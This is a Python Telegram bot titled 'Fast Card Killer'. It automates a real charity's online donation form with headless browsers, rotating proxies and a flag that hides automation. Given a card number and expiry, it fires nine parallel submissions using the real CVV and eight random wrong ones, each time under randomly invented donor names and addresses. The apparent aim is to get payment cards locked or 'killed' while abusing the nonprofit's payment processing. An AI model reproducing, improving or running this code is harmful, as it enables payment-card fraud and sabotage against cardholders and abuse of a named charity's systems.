import asyncio, os, random, logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from playwright.async_api import async_playwright
import nest_asyncio
nest_asyncio.apply()

TOKEN = os.getenv("TOKEN") or "YOUR_FALLBACK_TOKEN"
TARGET_URL = "https://giving.mclean.org/#gf_18"
AMOUNT = "1000"
DESIGNATION_TEXT = "The McLean Fund"
PROXY_FILE = "proxies.txt"

def load_proxies():
    try:
        with open(PROXY_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

FIRST_NAMES = ["John","Mary","Robert","Jennifer","Michael","Linda","William","Barbara"]
LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis"]
STREETS = ["123 Main St","456 Oak Ave","789 Pine Rd","321 Elm St","987 Maple Dr"]
CITIES = ["Boston","New York","Chicago","Los Angeles","Miami","Houston","Phoenix"]
STATES = ["MA","NY","IL","CA","FL","TX","AZ"]
ZIPS = ["02101","10001","60601","90001","33101","77001","85001"]
EMAIL_DOMAIN = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]

def random_donor():
    return {
        "first": random.choice(FIRST_NAMES),
        "last": random.choice(LAST_NAMES),
        "email": f"{random.choice(FIRST_NAMES).lower()}{random.randint(1,999)}@{random.choice(EMAIL_DOMAIN)}",
        "address": random.choice(STREETS),
        "city": random.choice(CITIES),
        "state": random.choice(STATES),
        "zip": random.choice(ZIPS)
    }

async def attempt_parallel(card, exp_month, exp_year, cvv, attempt_cvv, donor, proxy=None):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled'])
        context_kwargs = {}
        if proxy:
            context_kwargs['proxy'] = {"server": f"http://{proxy}"}
        context = await browser.new_context(**context_kwargs)
        page = await context.new_page()
        try:
            await page.goto(TARGET_URL, timeout=10000)
            await page.wait_for_selector("input#input_18_16_1", timeout=8000)
            await page.click("input[name='input_18_1'][value='1000']")
            await page.select_option("select#input_18_2", label=DESIGNATION_TEXT)
            await page.fill("input#input_18_3_3", donor["first"])
            await page.fill("input#input_18_3_6", donor["last"])
            await page.fill("input#input_18_4", donor["email"])
            await page.select_option("select#input_18_5_1", label="United States")
            await page.fill("input#input_18_5_4", donor["address"])
            await page.fill("input#input_18_5_5", donor["city"])
            await page.select_option("select#input_18_5_6", label=donor["state"])
            await page.fill("input#input_18_5_7", donor["zip"])
            await page.fill("input#input_18_16_1", card)
            await page.fill("input#input_18_16_2_month", exp_month.zfill(2))
            await page.fill("input#input_18_16_2_year", exp_year[-2:])
            await page.fill("input#input_18_16_3", attempt_cvv)
            async with page.expect_response(lambda r: "gf_ajax" in r.url or "gform" in r.url, timeout=10000) as resp:
                await page.click("input#gform_submit_button_18")
            response = await resp.value
            body = await response.text()
            await context.close()
            await browser.close()
            return (attempt_cvv, response.status, body[:150])
        except Exception as e:
            await context.close()
            await browser.close()
            return (attempt_cvv, None, str(e))

async def kill_card_fast(card, exp_month, exp_year, cvv):
    wrong = set()
    while len(wrong) < 8:
        w = str(random.randint(100,999)).zfill(3)
        if w != cvv:
            wrong.add(w)
    attempts = list(wrong) + [cvv]
    donor = random_donor()
    proxies = load_proxies() or [None]*9
    tasks = []
    for attempt_cvv in attempts:
        proxy = random.choice(proxies) if proxies else None
        tasks.append(attempt_parallel(card, exp_month, exp_year, cvv, attempt_cvv, donor, proxy))
    return await asyncio.gather(*tasks)

async def ko_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Use: /ko card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) == 4:
        card, month, year, cvv = [p.strip() for p in parts]
    else:
        tokens = raw.split()
        if len(tokens) >= 4:
            card, month, year, cvv = tokens[0], tokens[1], tokens[2], tokens[3]
        else:
            await update.message.reply_text("❌ Parse error. Example: /ko 4867960083635846|02|2031|149")
            return
    await update.message.reply_text(f"⚡ Killing {card} (9 parallel attempts)...")
    results = await kill_card_fast(card, month, year, cvv)
    report = "\n".join([f"CVV {cvv} -> Status: {st}, Body: {body[:80]}" for cvv, st, body in results])
    await update.message.reply_text(f"✅ Done in <15 sec.\n\n{report}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 Fast Card Killer (parallel, <15s)\nUse /ko card|month|year|cvv")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ko", ko_command))
    app.run_polling()

if __name__ == "__main__":
    main()